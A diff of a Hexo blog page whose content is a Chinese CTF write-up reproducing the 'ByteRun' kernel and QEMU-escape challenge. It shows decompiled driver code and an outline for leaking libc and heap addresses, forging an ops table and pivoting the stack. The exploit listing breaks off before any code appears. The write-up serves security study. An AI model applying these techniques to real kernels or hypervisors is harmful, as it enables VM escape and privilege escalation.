@@ -16,15 +16,23 @@
     
 <link rel="stylesheet" href="/css/style.css">
 
-    <link rel="shortcut icon" href="/images/ufo.ico">
-    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
-    <script id="hexo-configurations">
-    let KEEP = window.KEEP || {};
-    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/ling.JPG","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
-    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
+    
+        <link rel="shortcut icon" href="/images/ufo.ico">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"196082's blog","author":196082,"avatar":"/images/ling.JPG","logo":"/images/ling.JPG","favicon":"/images/ufo.ico"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":"浅浅更新博客一下吧~","category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"慢慢好起来"},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":true,"img_link":"/images/reward.jpg","text":"激励牛马，加速创作！","icon":"fa-solid fa-mug-hot"},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz","appkey":"C672AAYGXMkHxztf8ntdLShs","server_urls":null,"placeholder":"😜若有问题请各位大师傅留言评论"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"feed":{"type":"atom","path":"atom.xml","limit":20},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.2"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
   </script>
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
 </head>
 
 
@@ -36,67 +44,81 @@
 </div>
 
 
-<main class="page-container">
 
+<main class="page-container border-box">
+    <!-- home first screen  -->
     
 
-    <div class="page-main-content">
-
+    <!-- page content -->
+    <div class="page-main-content border-box">
         <div class="page-main-content-top">
-            <header class="header-wrapper">
-
-    <div class="header-content">
-        <div class="left">
             
-            <a class="logo-title" href="/">
-                196082&#39;s blog
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/ling.JPG">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               196082&#39;s blog
             </a>
         </div>
 
-        <div class="right">
-            <div class="pc">
-                <ul class="menu-list">
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
                                 首页
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/archives"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
                                 归档
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
-                                分类
-                            </a>
-                        </li>
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/tags"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
                                 标签
+                                
                             </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas fa-search"></i>
+                            <i class="menu-text-color fas search fa-search"></i>
                         </li>
                     
                 </ul>
             </div>
-            <div class="mobile">
+            <div class="mobile border-box flex-start">
                 
                     <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
@@ -108,26 +130,54 @@
     </div>
 
     <div class="header-drawer">
-        <ul class="drawer-menu-list">
+        <ul class="drawer-menu-list border-box">
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/">首页</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/archives">归档</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/categories">分类</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/tags">标签</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
         </ul>
@@ -140,97 +190,119 @@
 
         </div>
 
-        <div class="page-main-content-middle">
+        <div class="page-main-content-middle border-box">
 
-            <div class="main-content">
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        ByteRun复现
+                    </div>
+                
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/ling.JPG">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">196082</span>
+                                
+                                    <span class="author-badge">慢慢好起来</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
 
-        <div class="article-title">
-            <span class="title-hover-animation">ByteRun复现</span>
-        </div>
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
 
         
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/ling.JPG">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">196082</span>
-                        
-                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2023-04-01 15:05:48
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/msg-msg/">msg_msg</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/sk-buff/">sk_buff</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/pipe-buffer/">pipe_buffer</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/qemu-escape/">qemu escape</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2023-04-01 15:05:48</span>
+            </span>
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>6k 字</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>33 分钟</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Sat Apr 01 2023 15:05:25 GMT+0800">2023-04-01 15:05:25</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/msg-msg/">msg_msg</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/sk-buff/">sk_buff</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pipe-buffer/">pipe_buffer</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/qemu-escape/">qemu escape</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>6k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>33 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
     
 </div>
 
+                            </div>
+                        </div>
                     </div>
-                </div>
-            </div>
-        
+                
 
-        <div class="article-content markdown-body">
-            <p>当初看到墨晚鸢大佬的博客对这道题目的描述的时候就对这道题暗生情愫了，如今终于是得以复现。</p>
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>当初看到墨晚鸢大佬的博客对这道题目的描述的时候就对这道题暗生情愫了，如今终于是得以复现。</p>
 <h2 id="内核分析"><a href="#内核分析" class="headerlink" title="内核分析"></a>内核分析</h2><h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><p><del>这道题目要说难也算难，要说简单那就是说屁话</del>。这道题可以说是从逆向就开始变得不对劲起来。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">bytedev_read</span><span class="params">(__int64 a1, __int64 user_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 a3; <span class="comment">// r14</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v6; <span class="comment">// eax</span></span><br><span class="line">  __int64 v7; <span class="comment">// r13</span></span><br><span class="line">  __int64 idx; <span class="comment">// rax</span></span><br><span class="line">  __int64 offset; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 *v10; <span class="comment">// r8</span></span><br><span class="line">  __int64 read_size; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 remaining_size; <span class="comment">// rbx</span></span><br><span class="line">  __int64 read_chunk_pos; <span class="comment">// r15</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 v15; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v16; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v17; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v18; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v19; <span class="comment">// eax</span></span><br><span class="line">  __int64 v20; <span class="comment">// rbx</span></span><br><span class="line">  _WORD *chunk; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, user_buf);</span><br><span class="line">  a3 = v2;</span><br><span class="line">  v4 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v5 = v4 + <span class="number">40</span>;</span><br><span class="line">  raw_spin_lock(v4 + <span class="number">40</span>);</span><br><span class="line">  v6 = __indword(*(_QWORD *)(v4 + <span class="number">0x20</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    idx = *(<span class="keyword">int</span> *)(v7 + <span class="number">0xB0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)idx != *(_DWORD *)(v7 + <span class="number">0xB4</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      offset = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = *(<span class="keyword">unsigned</span> __int16 **)(v7 + <span class="number">8</span> * idx + <span class="number">0x30</span>);</span><br><span class="line">          read_size = v10[<span class="number">1</span>];</span><br><span class="line">          remaining_size = *v10 - (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read_size;</span><br><span class="line">          read_chunk_pos = (__int64)v10 + read_size + <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> ( remaining_size &gt; a3 )</span><br><span class="line">            remaining_size = a3;                <span class="comment">// current_read_size</span></span><br><span class="line">          <span class="keyword">if</span> ( (remaining_size &amp; <span class="number">0x80000000</span>) != <span class="number">0LL</span> )</span><br><span class="line">            BUG();</span><br><span class="line">          chunk = *(_WORD **)(v7 + <span class="number">8</span> * idx + <span class="number">0x30</span>);</span><br><span class="line">          _check_object_size((<span class="keyword">char</span> *)v10 + read_size + <span class="number">4</span>, remaining_size, <span class="number">1LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( copy_to_user(offset + user_buf, read_chunk_pos, remaining_size) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          a3 -= remaining_size;</span><br><span class="line">          offset += remaining_size;</span><br><span class="line">          v14 = (<span class="keyword">unsigned</span> __int16)(remaining_size + chunk[<span class="number">1</span>]);</span><br><span class="line">          chunk[<span class="number">1</span>] += remaining_size;</span><br><span class="line">          <span class="keyword">if</span> ( (_WORD)v14 == *chunk )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (_WORD)v14 != <span class="number">0xFFC</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">            kfree(chunk);</span><br><span class="line">            *(_DWORD *)(v7 + <span class="number">0xB0</span>) = (*(_DWORD *)(v7 + <span class="number">0xB0</span>) + <span class="number">1</span>) % <span class="number">0x10</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( a3 )</span><br><span class="line">          &#123;</span><br><span class="line">            idx = *(<span class="keyword">int</span> *)(v7 + <span class="number">0xB0</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (_DWORD)idx != *(_DWORD *)(v7 + <span class="number">0xB4</span>) )</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(&amp;unk_F90);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_1038);</span><br><span class="line">LABEL_21:</span><br><span class="line">    raw_spin_unlock(v5);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v16 = <span class="number">0x200</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x200</span> )</span><br><span class="line">    v16 = a3;</span><br><span class="line">  v17 = *(_QWORD *)(v15 + <span class="number">0x20</span>);</span><br><span class="line">  v18 = __indword(v17);</span><br><span class="line">  <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v19 = __indword(v17 + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v19 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = *(_QWORD *)(v15 + <span class="number">0x18</span>);</span><br><span class="line">      _check_object_size(v20, v16, <span class="number">1LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( copy_to_user(user_buf, v20, v16) )</span><br><span class="line">        printk(&amp;unk_1010);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_FF0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  bytedev_read_cold_14();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -284,209 +356,304 @@
 <h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>这里利用方法其实挺简单的，就直接在<code>BYTEPCIDevState</code>结构体上找可以利用的地址计算差值即可。思路就是首先泄漏libc地址再泄漏heap地址即可。最后泄漏ops中的内容，并且伪造ops。在最后劫持ops实现栈迁移到堆地址即可完成利用。</p>
 <h2 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span 